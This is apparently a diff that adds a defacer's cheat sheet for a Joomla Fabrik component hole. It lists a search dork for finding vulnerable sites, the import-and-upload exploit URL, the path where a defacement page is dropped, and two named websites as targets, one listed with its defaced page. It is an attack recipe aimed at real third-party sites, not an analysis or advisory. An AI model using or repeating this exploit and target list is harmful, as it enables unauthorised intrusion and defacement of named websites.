@@ -1,0 +1,50 @@
+
+
+
+
+		joomla
+		
+		site.com/administrator
+		
+		index.php?option=com_fabrik
+		
+		Dork	:	inurl:index.php?option=com_fabrik
+		
+				
+		Target 1	:	www.expertaupair.com
+		
+		/index.php?option=com_fabrik
+		
+		site.com/exploit
+		
+		estesna	:	/en   /fa	/ar
+		
+		site.com/en/exploit
+		
+		Exploit	:	index.php?option=com_fabrik&c=import&view=import&filetype=csv&tables=1
+		
+		
+		site.com/media/behrouz.html
+		
+		deface	:	www.expertaupair.com/media/behrouz.html
+		
+		
+		Target	2	:	http://simintaak.com
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
